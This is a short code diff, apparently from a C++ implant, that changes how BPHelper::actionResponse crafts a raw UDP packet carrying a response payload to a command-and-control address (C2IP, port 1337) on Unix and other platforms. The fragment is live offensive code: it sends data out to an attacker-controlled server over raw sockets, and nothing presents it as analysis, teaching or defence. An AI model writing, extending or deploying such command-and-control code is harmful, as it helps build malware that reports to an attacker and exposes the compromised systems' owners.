@@ -51,13 +51,8 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
             vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
             payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_response));
 
-#ifdef defined(_WIN32) || defined(WIN32)
-            vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
-                                                 C2IP,
-                                                 1337,
-                                                 1337,
-                                                 payload);
-#else
+#ifdef __unix__
+       
             vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                                  C2IP,
                                                  1337,
@@ -65,6 +60,14 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
                                                  payload,
                                                  rawSocket.getMac(),
                                                  nextHopMac);
+
+#else
+            vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
+                C2IP,
+                1337,
+                1337,
+                payload);
+
 #endif
 
             rawSocket.send(req);
